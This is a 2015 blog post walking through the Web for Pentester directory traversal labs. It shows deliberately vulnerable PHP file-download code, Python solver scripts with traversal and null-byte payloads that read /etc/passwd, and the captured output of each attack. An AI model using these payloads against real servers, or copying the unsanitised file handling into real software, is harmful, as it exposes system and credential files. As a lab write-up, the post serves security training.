<!DOCTYPE html>
<html>
<head>
    <title>Web for Pentester ../../Directory%20Traversal // multiplex3r.github.io</title>

    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    
    
    

        <meta property="og:title" content="Web for Pentester ../../Directory%20Traversal" />
    <meta property="og:description" content="" />
    <meta property="og:type" content="website" />
    <meta property="og:locale" content="en" />
    <meta property="og:url" content="https://multiplex3r.github.io/posts/2015-10-13-web-for-pentester-directory-traversal/" />
    

    <link rel="shortcut icon" href="/favicon.ico">

    <link href="https://multiplex3r.github.io/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
    <link href="https://multiplex3r.github.io/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">

    <link rel="stylesheet" href="https://multiplex3r.github.io/css/style.css">
    

    <meta name="generator" content="Hugo 0.71.1" />
</head>


<body>
<div id="container">
    <header id="header">
    <div id="header-outer" class="outer">
        <div id="header-inner" class="inner">
            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
            <a id="logo" class="logo-text" href="https://multiplex3r.github.io/">multiplex3r.github.io</a>
            <nav id="main-nav">
                
                <a class="main-nav-link" href="/about/">About me</a>
                
                <a class="main-nav-link" href="/tags/">Tags</a>
                
            </nav>
            <nav id="sub-nav">
                <div id="search-form-wrap">
                </div>
            </nav>
        </div>
    </div>
</header>

    <section id="main" class="outer">
        <article class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        <header class="article-header">
            <h1 class="article-title" itemprop="name">Web for Pentester ../../Directory%20Traversal</h1>
        </header>
        
        <div class="article-meta">
            <a href="/posts/2015-10-13-web-for-pentester-directory-traversal/" class="article-date">
                <time datetime='2015-10-13T10:32:00.000&#43;11:00' itemprop="datePublished">2015-10-13</time>
            </a>
            
            
            
        </div>
        <div class="article-entry" itemprop="articleBody">
            <p>This post is going to cover the Web for Pentester directory traversal examples. I am going to go through the source code of the examples and explain the vulnerabilities and how to exploit them.</p>
<p>Here be spoilers! Don&rsquo;t read on if you don&rsquo;t want to see the answers.</p>
<h3 id="directory-traversal">Directory Traversal</h3>
<p>A directory traversal attack is an information disclosure type attack where the attacker tries to gain control of a web application via a user controled parameter such that they can access files outside the web root on the web server, e.g. source code, configuration files, log files and other senisitive operating system files.</p>
<h4 id="example-1">Example 1</h4>
<p>This example is fairly straight forward. The code below defines a parameter named <code>file</code> on line 11 which has no input sanitisation. This means we can simply send some <code>../../../</code>'s to escape the web root and a path and file we want to access.</p>
<p>Directory Traversal - Example 1</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 

$UploadDir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/files/&#39;</span>; 

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])))
    <span style="color:#66d9ef">die</span>();


$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>];

$path <span style="color:#f92672">=</span> $UploadDir <span style="color:#f92672">.</span> $file;

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_file</span>($path))
    <span style="color:#66d9ef">die</span>();

<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Cache-Control: must-revalidate, post-check=0, pre-check=0&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Cache-Control: public&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: inline; filename=&#34;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($path) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&#34;;&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Transfer-Encoding: binary&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Length: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">filesize</span>($path));

$handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($path, <span style="color:#e6db74">&#39;rb&#39;</span>);

<span style="color:#66d9ef">do</span> {
$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($handle, <span style="color:#ae81ff">8192</span>);
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
<span style="color:#66d9ef">break</span>;
}
<span style="color:#66d9ef">echo</span>($data);
} <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>);

<span style="color:#a6e22e">fclose</span>($handle);
<span style="color:#66d9ef">exit</span>();


<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>I am going to try to access the /etc/passwd file using the following python script.</p>
<p>Directory Traversal - Example 1 Solver</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> sys

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: &#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &lt;ip&gt; or &lt;hostname&gt;&#34;</span>
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/dirtrav/example1.php?file=../../../../../../etc/passwd&#34;</span>
exploit <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> payload)

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[!] Sending payload: &#34;</span> <span style="color:#f92672">+</span> payload
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Status Code: &#34;</span> <span style="color:#f92672">+</span> str(exploit<span style="color:#f92672">.</span>status_code)
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Headers..&#34;</span>
<span style="color:#66d9ef">for</span> item, value <span style="color:#f92672">in</span> exploit<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>items():
    <span style="color:#66d9ef">print</span> item, value
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] End of Headers..&#34;</span>
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Start of body..&#34;</span>
<span style="color:#66d9ef">print</span> exploit<span style="color:#f92672">.</span>text
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] End of body..&#34;</span>
</code></pre></div><p>The payload in the above script <code>file=../../../../../../etc/passwd</code> can be sent using a browser or any other type of http client.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">./dirtrav1.py 192.168.10.65
[!] Sending payload: /dirtrav/example1.php?file=../../../../../../etc/passwd
[+] Status Code: 200
[+] Headers..
content-length 475
content-disposition inline; filename=&#34;passwd&#34;;
content-encoding gzip
content-transfer-encoding binary
x-powered-by PHP/5.3.3-7+squeeze15
vary Accept-Encoding
keep-alive timeout=15, max=100
server Apache/2.2.16 (Debian)
connection Keep-Alive
cache-control public
date Sun, 13 Sep 2015 03:37:25 GMT
content-type text/html
[+] End of Headers..
[+] Start of body..
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash

[+] End of body..
</code></pre></div><p>It&rsquo;s vary rare that you would see this type of vulnerability these days but understanding it at this level lets us build on this foundation and learn more advanced concepts.</p>
<h4 id="example-2">Example 2</h4>
<p>In this example, the developer has put in a basic control that specifies the path to the files directory must be in the file parameters value, which is supplied by the user. Unfortunately, other than this basic check all other input from the user is left in tact.</p>
<p>Directory Traversal - Example 2</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 


<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])))
    <span style="color:#66d9ef">die</span>();


$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>];

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">strstr</span>($file,<span style="color:#e6db74">&#34;/var/www/files/&#34;</span>)))
    <span style="color:#66d9ef">die</span>();

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_file</span>($file))
    <span style="color:#66d9ef">die</span>();

<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Cache-Control: must-revalidate, post-check=0, pre-check=0&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Cache-Control: public&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: inline; filename=&#34;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($file) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&#34;;&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Transfer-Encoding: binary&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Length: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">filesize</span>($file));

$handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($file, <span style="color:#e6db74">&#39;rb&#39;</span>);

<span style="color:#66d9ef">do</span> {
$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($handle, <span style="color:#ae81ff">8192</span>);
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
<span style="color:#66d9ef">break</span>;
}
<span style="color:#66d9ef">echo</span>($data);
} <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>);

<span style="color:#a6e22e">fclose</span>($handle);
<span style="color:#66d9ef">exit</span>();


<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>In order to beat this control, our payload must pass the check on line 10. The following python script attempts to exploit this vulnerability and display /etc/passwd&rsquo;s contents once again.</p>
<p>Directory Traversal - Example 2 Solver</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> sys

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: &#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;ip&gt; or &lt;hostname&gt;&#34;</span>
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/dirtrav/example1.php?file=/var/www/files/../../../../../../etc/passwd&#34;</span>
exploit <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> payload)

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Status Code: &#34;</span> <span style="color:#f92672">+</span> str(exploit<span style="color:#f92672">.</span>status_code)
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Headers..&#34;</span>
<span style="color:#66d9ef">for</span> item, value <span style="color:#f92672">in</span> exploit<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>items():
    <span style="color:#66d9ef">print</span> item, value
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] End of Headers..&#34;</span>
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Start of body..&#34;</span>
<span style="color:#66d9ef">print</span> exploit<span style="color:#f92672">.</span>text
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] End of body..&#34;</span>
</code></pre></div><p>There we have it, the payload <code>file=/var/www/files/../../../../../../etc/passwd</code> will exploit this vulnerability.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">./dirtrav2.py 192.168.10.65
[!] Sending payload: /dirtrav/example2.php?file=/var/www/files/../../../../../../etc/passwd
[+] Status Code: 200
[+] Headers..
content-length 475
content-disposition inline; filename=&#34;passwd&#34;;
content-encoding gzip
content-transfer-encoding binary
x-powered-by PHP/5.3.3-7+squeeze15
vary Accept-Encoding
keep-alive timeout=15, max=100
server Apache/2.2.16 (Debian)
connection Keep-Alive
cache-control public
date Sun, 13 Sep 2015 03:39:19 GMT
content-type text/html
[+] End of Headers..
[+] Start of body..
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash

[+] End of body..
</code></pre></div><h4 id="example-3">Example 3</h4>
<p>In this example things are getting to be a little more real world, so that we can only view png&rsquo;s the developer has hard coded the file type <code>.png</code> essentially ruling out viewing other file types. Unfortunately, on many operating systems, a bypass for this type of control exists where appending a null-byte <code>%00</code> to the end of your payload terminates the file name and essentially discards the enforced .png on line 10.</p>
<p>Directory Traversal - Example 3</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
$UploadDir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/files/&#39;</span>; 

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])))
    <span style="color:#66d9ef">die</span>();


$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>];

$path <span style="color:#f92672">=</span> $UploadDir <span style="color:#f92672">.</span> $file<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.png&#34;</span>;
<span style="color:#75715e">// Simulate null-byte issue that used to be in filesystem related functions in PHP
</span><span style="color:#75715e"></span>$path <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/\x00.*/&#39;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$path);

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_file</span>($path))
    <span style="color:#66d9ef">die</span>();

<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Cache-Control: must-revalidate, post-check=0, pre-check=0&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Cache-Control: public&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: inline; filename=&#34;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($path) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&#34;;&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Transfer-Encoding: binary&#39;</span>);
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Length: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">filesize</span>($path));

$handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($path, <span style="color:#e6db74">&#39;rb&#39;</span>);

<span style="color:#66d9ef">do</span> {
$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($handle, <span style="color:#ae81ff">8192</span>);
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
<span style="color:#66d9ef">break</span>;
}
<span style="color:#66d9ef">echo</span>($data);
} <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>);

<span style="color:#a6e22e">fclose</span>($handle);
<span style="color:#66d9ef">exit</span>();

<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>To solve this challenge, I&rsquo;ve copied my previous exploit and changed the payload. The intent is for us to successfully display /etc/passwd as per previous attacks.</p>
<p>Example 3 Solver</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> sys

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: &#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &lt;ip&gt; or &lt;hostname&gt;&#34;</span>
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/dirtrav/example3.php?file=../../../../../../etc/passwd%00&#34;</span>
exploit <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> payload)

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[!] Sending payload: &#34;</span> <span style="color:#f92672">+</span> payload
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Status Code: &#34;</span> <span style="color:#f92672">+</span> str(exploit<span style="color:#f92672">.</span>status_code)
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Headers..&#34;</span>
<span style="color:#66d9ef">for</span> item, value <span style="color:#f92672">in</span> exploit<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>items():
    <span style="color:#66d9ef">print</span> item, value
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] End of Headers..&#34;</span>
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Start of body..&#34;</span>
<span style="color:#66d9ef">print</span> exploit<span style="color:#f92672">.</span>text
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] End of body..&#34;</span>
</code></pre></div><p>Success!! The null-byte did the trick.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">./dirtrav3.py 192.168.10.65
[!] Sending payload: /dirtrav/example3.php?file=../../../../../../etc/passwd%00
[+] Status Code: 200
[+] Headers..
content-length 475
content-disposition inline; filename=&#34;passwd&#34;;
content-encoding gzip
content-transfer-encoding binary
x-powered-by PHP/5.3.3-7+squeeze15
vary Accept-Encoding
keep-alive timeout=15, max=100
server Apache/2.2.16 (Debian)
connection Keep-Alive
cache-control public
date Sun, 13 Sep 2015 04:19:30 GMT
content-type text/html
[+] End of Headers..
[+] Start of body..
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash

[+] End of body..
</code></pre></div><h3 id="conclusion">Conclusion</h3>
<p>I really enjoy the Web for Pentester series, and trying to automate the attacks using python scripts is a bit of extra fun. I hope you enjoyed this post! Feel free to follow me on Twitter for more write ups and infosec musings.</p>
<p>Cheers,</p>
<p>@multiplex3r</p>
        </div>

        
        
        <div class="article-toc" >
            <h3>Contents</h3>
            <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#directory-traversal">Directory Traversal</a></li>
        <li><a href="#conclusion">Conclusion</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
        
        

        


        
        <footer class="article-footer">
            <ul class="article-tag-list">
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/lfi">lfi
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/rfi">rfi
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/code-injection">code injection
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/directory-traversal">directory traversal
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/command-injection">command injection
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/ldap-attacks">LDAP attacks
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/file-upload">File Upload
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/xml-attacks">XML attacks
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/beginner">beginner
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/web">web
                    </a>
                </li>
                
            </ul>
        </footer>
        
    </div>
    
<nav id="article-nav">
    
    <a href="/posts/2016-01-31-sectalks-0x00-workspaces-and-you/" id="article-nav-newer" class="article-nav-link-wrap">
        <div class="article-nav-title"><span>&lt;</span>&nbsp;
            SecTalks 0x00 - Metasploit Workspaces and you!
        </div>
    </a>
    
    
    <a href="/posts/2015-02-16-web-for-pentester-sqli/" id="article-nav-older" class="article-nav-link-wrap">
        <div class="article-nav-title">Web for Pentester SQLi&nbsp;<span>&gt;</span></div>
    </a>
    
</nav>


</article>

        
    </section>
    <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            &copy; 2020 multiplex3r.github.io
            <br />
            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with theme <a href="https://github.com/carsonip/hugo-theme-minos" target="_blank">Minos</a>
        </div>
    </div>
    

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    
    <script>
        document.getElementById('main-nav-toggle').addEventListener('click', function () {
            var header = document.getElementById('header');
            if (header.classList.contains('mobile-on')) {
                header.classList.remove('mobile-on');
            } else {
                header.classList.add('mobile-on');
            }
        });
    </script>
</footer>

</div>
</body>
</html>
